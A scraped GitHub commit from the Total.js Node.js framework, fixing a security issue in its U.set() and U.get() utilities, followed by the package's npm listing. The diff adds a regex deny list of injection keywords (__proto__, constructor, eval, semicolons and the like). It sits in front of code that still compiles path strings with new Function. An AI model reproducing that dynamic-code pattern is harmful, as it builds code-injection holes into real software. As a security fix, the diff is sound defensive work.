  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftotaljs%2Fframework%2Fcommit%2F887b0fa9e162ef7a2dd9cec20a5ca122726373b3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=totaljs%2Fframework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[totaljs](/totaljs)
/
**[framework](/totaljs/framework)**
Public

* [Notifications](/login?return_to=%2Ftotaljs%2Fframework) You must be signed in to change notification settings
* [Fork
  449](/login?return_to=%2Ftotaljs%2Fframework)
* [Star
   4.4k](/login?return_to=%2Ftotaljs%2Fframework)

* [Code](/totaljs/framework)
* [Issues
  2](/totaljs/framework/issues)
* [Pull requests
  0](/totaljs/framework/pulls)
* [Discussions](/totaljs/framework/discussions)
* [Actions](/totaljs/framework/actions)
* [Projects
  0](/totaljs/framework/projects)
* [Security](/totaljs/framework/security)
* [Insights](/totaljs/framework/pulse)

Additional navigation options

* [Code](/totaljs/framework)
* [Issues](/totaljs/framework/issues)
* [Pull requests](/totaljs/framework/pulls)
* [Discussions](/totaljs/framework/discussions)
* [Actions](/totaljs/framework/actions)
* [Projects](/totaljs/framework/projects)
* [Security](/totaljs/framework/security)
* [Insights](/totaljs/framework/pulse)

## Commit

[Permalink](/totaljs/framework/commit/887b0fa9e162ef7a2dd9cec20a5ca122726373b3)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fixed security issue in `U.set()` and `U.get()`.

[Browse files](/totaljs/framework/tree/887b0fa9e162ef7a2dd9cec20a5ca122726373b3)
Browse the repository at this point in the history

* Loading branch information

[![@petersirka](https://avatars.githubusercontent.com/u/2414252?s=40&v=4)](/petersirka)

[petersirka](/totaljs/framework/commits?author=petersirka "View all commits by petersirka")
committed
Jun 4, 2021

1 parent
[2fe92a6](/totaljs/framework/commit/2fe92a62d0c7e3158f79b6a7bbf29a5aa08a1612)

commit 887b0fa

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**9 additions**
and
**4 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* changes.txt
  [changes.txt](#diff-652d5876e7e73c420820682a12ecdec66ecdec029223e24808e129d64493a967)
* utils.js
  [utils.js](#diff-fda8f0e13abe3d5c5685ad895fa528dd6067c41b66b6ebc6d1de71ca9a704d8d)

## There are no files selected for viewing

1 change: 1 addition & 0 deletions

1
[changes.txt](#diff-652d5876e7e73c420820682a12ecdec66ecdec029223e24808e129d64493a967 "changes.txt")

Show comments

[View file](/totaljs/framework/blob/887b0fa9e162ef7a2dd9cec20a5ca122726373b3/changes.txt)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -4,6 +4,7 @@ |
|  |  | - added `insecure` flag into the `U.request()` method |
|  |  | - added `RESTBuilder.insecure()` method |
|  |  | - fixed security issue when parsing query arguments (reported by <https://github.com/fl4x>) |
|  |  | - fixed security in `U.get()` and `U.set()` (reported by Agustin Gianni) |
|  |  |  |
|  |  | ======= 3.4.8 |
|  |  |  |
| Expand Down | |  |

12 changes: 8 additions & 4 deletions

12
[utils.js](#diff-fda8f0e13abe3d5c5685ad895fa528dd6067c41b66b6ebc6d1de71ca9a704d8d "utils.js")

Show comments

[View file](/totaljs/framework/blob/887b0fa9e162ef7a2dd9cec20a5ca122726373b3/utils.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -6617,12 +6617,16 @@ exports.parseTheme = function(value) { |
|  |  | return value === '?' ? CONF.default\_theme : value; |
|  |  | }; |
|  |  |  |
|  |  |  |
|  |  | exports.set = function(obj, path, value) { |
|  |  | var cachekey = 'S+' + path; |
|  |  |  |
|  |  | if (F.temporary.other[cachekey]) |
|  |  | return F.temporary.other[cachekey](obj, value); |
|  |  |  |
|  |  | if ((/\_\_proto\_\_|constructor|prototype|eval|function|\\*|\+|;|\s|\(|\)|!/).test(path)) |
|  |  | return value; |
|  |  |  |
|  |  | var arr = parsepath(path); |
|  |  | var builder = []; |
|  |  |  |
| Expand All | | @@ -6636,12 +6640,9 @@ exports.set = function(obj, path, value) { |
|  |  | var ispush = v.lastIndexOf('[]') !== -1; |
|  |  | var a = builder.join(';') + ';var v=typeof(a)===\'function\'?a(U.get(b)):a;w' + (v[0] === '[' ? '' : '.') + (ispush ? v.replace(REGREPLACEARR, '.push(v)') : (v + '=v')) + ';return v'; |
|  |  |  |
|  |  | if ((/\_\_proto\_\_|constructor|prototype|eval/).test(a)) |
|  |  | throw new Error('Potential vulnerability'); |
|  |  |  |
|  |  | var fn = new Function('w', 'a', 'b', a); |
|  |  | F.temporary.other[cachekey] = fn; |
|  |  | fn(obj, value, path); |
|  |  | return fn(obj, value, path); |
|  |  | }; |
|  |  |  |
|  |  | exports.get = function(obj, path) { |
| Expand All | | @@ -6651,6 +6652,9 @@ exports.get = function(obj, path) { |
|  |  | if (F.temporary.other[cachekey]) |
|  |  | return F.temporary.other[cachekey](obj); |
|  |  |  |
|  |  | if ((/\_\_proto\_\_|constructor|prototype|eval|function|\\*|\+|;|\s|\(|\)|!/).test(path)) |
|  |  | return; |
|  |  |  |
|  |  | var arr = parsepath(path); |
|  |  | var builder = []; |
|  |  |  |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `887b0fa`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftotaljs%2Fframework%2Fcommit%2F887b0fa9e162ef7a2dd9cec20a5ca122726373b3) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.npmjs.com_469964bb_20250114_205933.html ===

skip to:[content](#main)[package search](#search)[sign in](#signin)â¤

* [Pro](/products/pro)
* [Teams](/products/teams)
* [Pricing](/products)
* [Documentation](https://docs.npmjs.com)
npmSearch[Sign Up](/signup)[Sign In](/login)
## total.js

3.4.13Â â¢Â PublicÂ â¢Â Published 3 years ago

* [Readme](?activeTab=readme)
* [Code Beta](?activeTab=code)
* [0 Dependencies](?activeTab=dependencies)
* [10 Dependents](?activeTab=dependents)
* [732 Versions](?activeTab=versions)

[![Professional Support](https://camo.githubusercontent.com/02cba4d902c42c510c9a9bc470336da0bccd011afb0b424d86d9339c51af15a3/68747470733a2f2f7777772e746f74616c6a732e636f6d2f696d672f62616467652d737570706f72742e737667)](https://www.totaljs.com/support/) [![Chat with contributors](https://camo.githubusercontent.com/62feb73e2b2a1c41a6dc8d4662a0cc66c378bccf1e411ef72111c8098f4fcaed/68747470733a2f2f7777772e746f74616c6a732e636f6d2f696d672f62616467652d636861742e737667)](https://messenger.totaljs.com) [![NPM version](https://camo.githubusercontent.com/c694d2ee6f41f2d0403ec211d08b301e2ca0fbf49929903fb7e90a1352cfdc6f/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f762f746f74616c2e6a732e7376673f7374796c653d666c6174)](https://npmjs.org/package/total.js) [![NPM quality](https://camo.githubusercontent.com/6be2d89a25743ac9ada26c4bbee19fe834e45b62e6684b5464715ec5e48a5093/687474703a2f2f6e706d2e7061636b6167657175616c6974792e636f6d2f736869656c642f746f74616c2e6a732e737667)](http://packagequality.com/#?package=total.js) [![NPM downloads](https://camo.githubusercontent.com/c0c1bc8fcc1363603314c5638be75a59ae6de6a42dfb1f9ea81078831ba49468/68747470733a2f2f696d672e736869656c64732e696f2f6e706d2f646d2f746f74616c2e6a732e7376673f7374796c653d666c6174)](https://npmjs.org/package/total.js) [![MIT License](https://camo.githubusercontent.com/dd1c858e94a371529a0a4c359bc95f18f09ba4a5fc0e658950bcb1383ea40fc9/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d4d49542d626c75652e7376673f7374796c653d666c6174)](https://github.com/totaljs/framework/blob/HEAD/license.txt) [![Build Status](https://camo.githubusercontent.com/c216dace89595e1fa07b35dbd47e9ce0f88b21e9c3d6a5cf57725a856f6b734e/68747470733a2f2f696d672e736869656c64732e696f2f7472617669732f746f74616c6a732f6672616d65776f726b2e7376673f7374796c653d666c6174)](https://travis-ci.org/totaljs/framework) [![Gitter chat](https://camo.githubusercontent.com/6cea0127fc5d0e20da0d11b3a1da2152401c2bf05c15b83ae82cfeabfc06dbfd/68747470733a2f2f6261646765732e6769747465722e696d2f746f74616c6a732f6672616d65776f726b2e706e67)](https://messenger.totaljs.com)

# Node.js framework

**Total.js framework** is a framework for Node.js platfrom written in `pure` JavaScript similar to PHP's Laravel or Python's Django or ASP.NET MVC. It can be used as web, desktop, service or IoT application.

**IMPORTANT**: [New version **Total.js 4**](https://github.com/totaljs/framework/blob/HEAD/github.com/totaljs/framework4)

```
$ npm install -g total.js
```

* [Total.js Code editor](http://www.totaljs.com/code/)
* [Total.js CMS](http://www.totaljs.com/cms/)
* [Total.js Eshop](http://www.totaljs.com/eshop/)
* [Total.js Wiki](https://www.totaljs.com/wiki/)
* [Total.js Flow](https://www.totaljs.com/flow/)
* [Total.js Flowboard](https://www.totaljs.com/flowboard/)
* [Total.js Messenger](https://www.totaljs.com/messenger/)
* [Total.js Dashboard](https://www.totaljs.com/dashboard/)
* [Total.js BlogEngine](https://www.totaljs.com/blogengine/)
* [Total.js SuperAdmin](https://www.totaljs.com/superadmin/)
* [Total.js HelpDesk](https://www.totaljs.com/helpdesk/)
* [Total.js OpenPlatform](https://www.totaljs.com/openplatform/)
* [Total.js +100 examples](https://github.com/totaljs/examples)
* [NoSQL embedded database explorer](https://www.totaljs.com/nosql/)
* [Download +200 UI components for free](https://componentator.com)
* [Download +100 CMS widgets for free](https://componentator.com/widgets/)

---

* [Website](http://www.totaljs.com)
* [**Get Started**](http://www.totaljs.com/get-started/)
* [**Documentation**](http://docs.totaljs.com)
* [**Wiki for Total.js products**](http://wiki.totaljs.com)
* [**Live chat with professional support**](https://platform.totaljs.com?app=messenger)
* [**Total.js Blog**](https://blog.totaljs.com)
* [**Membership**](https://platform.totaljs.com)
* [Changelog](https://github.com/totaljs/framework/blob/master/changes.txt)

## Official support

* [Support form](http://www.totaljs.com/support/)
* Support e-mail: support@totaljs.com

| Top features |
| --- |
| [**Offline documentation**](http://docs.totaljs.com) |
| **Backward compatibility** |
| HMVC architecture |
| Clean directory structure |
| Fully asynchronous |
| Full web server with serving of static files |
| Supports IP restrictions |
| Supports redirections |
| Supports reusable components |
| Supports just-in-time JS, CSS (variables and nesting) and HTML compressor |
| Supports just-in-time merging of static files (JavaScripts, CSS or HTML) |
| Supports just-in-time mapping of files |
| Supports media streaming (e.g. videos) |
| Supports modules and packages |
| Built-in image processing engine via ImageMagick or GraphicsMagick |
| Supports WebSockets (**RFC 6455**) and Server-Sent events |
| **NEW** Supports WebSockets client |
| Supports `multipart/x-mixed-replace` (IP camera streaming) uploading and sending |
| Supports RESTful routing |
| Supports middleware (like express.js) with custom options |
| Supports unit testing |
| Supports workers for heavy CPU operations |
| Supports 4x config files (common, debug, release and test) |
| Mailer with templating (Gmail, Outlook or classic SMTP servers with auth and TLS) |
| Built-in view engine (layouts, nested views, conditions, loops, inline helpers, etc.) |
| Localization with diff tool and CSV export |
| Supports cache mechanism |
| Supports schemas for creating business objects with validations, workflows, etc. |
| Supports injecting scripts, packages and views from URL |
| Supports String, Date, Number and Array prototypes |
| Supports additional utilities (e.g. create request, XML parsing, etc.) |
| Supports themes |
| Supports scripting |
| Possibility to rewrite existing functionality |
| NoSQL embedded database |

## Social networks

Please support the framework on social networks.

* [Follow Total.js on Gitter](https://gitter.im/totaljs/framework)
* [Follow Total.js on GitHub](https://github.com/totaljs/framework)
* [Follow Total.js on Twitter - **@totalframework**](https://twitter.com/totalframework)
* [Follow Total.js on Facebook](https://www.facebook.com/totaljs.web.framework)
* [Follow Total.js on LinkedIn](https://www.linkedin.com/groups/totaljs-8109884)

## Contact

* (c) 2012-2021 by Peter Å irka - petersirka@gmail.com
* contact form <https://www.totaljs.com/contact/>
* info@totaljs.com
## Readme

### Keywords

* [total](/search?q=keywords:total)
* [iot](/search?q=keywords:iot)
* [framework](/search?q=keywords:framework)
* [web](/search?q=keywords:web)
* [websocket](/search?q=keywords:websocket)
* [mvc](/search?q=keywords:mvc)
* [controller](/search?q=keywords:controller)
* [view](/search?q=keywords:view)
* [angular.js](/search?q=keywords:angular.js)
* [upload](/search?q=keywords:upload)
* [picture](/search?q=keywords:picture)
* [graphicsmagick](/search?q=keywords:graphicsmagick)
* [imagemagick](/search?q=keywords:imagemagick)
* [eshop](/search?q=keywords:eshop)
* [blog](/search?q=keywords:blog)
* [forum](/search?q=keywords:forum)
* [chat](/search?q=keywords:chat)
* [game](/search?q=keywords:game)
* [nosql](/search?q=keywords:nosql)
* [database](/search?q=keywords:database)
* [streaming](/search?q=keywords:streaming)
* [live](/search?q=keywords:live)
* [server sent events](/search?q=keywords:"server sent events")
* [sse](/search?q=keywords:sse)
* [multipart](/search?q=keywords:multipart)
* [x-mixed-replace](/search?q=keywords:x-mixed-replace)
## Package Sidebar

### Install

`npm i total.js`

### Repository

[Gitgithub.com/totaljs/framework](https://github.com/totaljs/framework)

### Homepage

[www.totaljs.com](http://www.totaljs.com)

### DownloadsWeekly Downloads

1,560

### Version

3.4.13

### License

MIT

### Unpacked Size

1.39 MB

### Total Files

26

### Last publish

3 years ago

### Collaborators

* [![petersirka](/npm-avatar/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdmF0YXJVUkwiOiJodHRwczovL3MuZ3JhdmF0YXIuY29tL2F2YXRhci84M2EzNTFkOWQxZDk3NjhlZTQ5ZGM4NjVhYjVkM2JiZD9zaXplPTEwMCZkZWZhdWx0PXJldHJvIn0.cEoUXsbpsctISMmlRUXCUtEYFHeSssXnE3Q17wQAcLA "petersirka")](/~petersirka)
[**Try** on RunKit](https://runkit.com/npm/total.js)[**Report** malware](/support?inquire=security&security-inquire=malware&package=total.js&version=3.4.13)
## Footer

### Support

* [Help](https://docs.npmjs.com)
* [Advisories](https://github.com/advisories)
* [Status](http://status.npmjs.org/)
* [Contact npm](/support)
### Company

* [About](/about)
* [Blog](https://github.blog/tag/npm/)
* [Press](/press)
### Terms & Policies

* [Policies](/policies/)
* [Terms of Use](/policies/terms)
* [Code of Conduct](/policies/conduct)
* [Privacy](/policies/privacy)


